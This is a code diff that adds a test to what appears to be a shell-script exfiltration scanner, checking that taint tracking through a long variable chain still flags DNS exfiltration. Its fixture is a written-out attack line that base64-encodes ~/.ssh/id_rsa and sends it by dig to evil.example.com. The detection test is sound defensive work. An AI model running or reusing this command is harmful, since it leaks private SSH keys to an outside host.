@@ -97,6 +97,15 @@ def test_mixed_file_tainted_var_and_inline_encoder_is_covered():
     assert "SHELL_DNS_EXFIL" in _rules(src)
 
 
+def test_deep_variable_chain_is_not_under_tainted():
+    # The taint worklist has no pass cap, so an arbitrarily deep var chain still
+    # propagates (a pass-capped fixpoint would have silently under-tainted -- fail-open).
+    chain = ["v0=$(cat ~/.ssh/id_rsa | base64)"]
+    chain += [f"v{i}=$v{i-1}" for i in range(1, 100)]
+    chain.append("dig $v99.evil.example.com")
+    assert "SHELL_DNS_EXFIL" in _rules("\n".join(chain) + "\n")
+
+
 def test_host_regex_is_redos_safe():
     # A long run of spaces before a non-host word must not catastrophically backtrack.
     import time
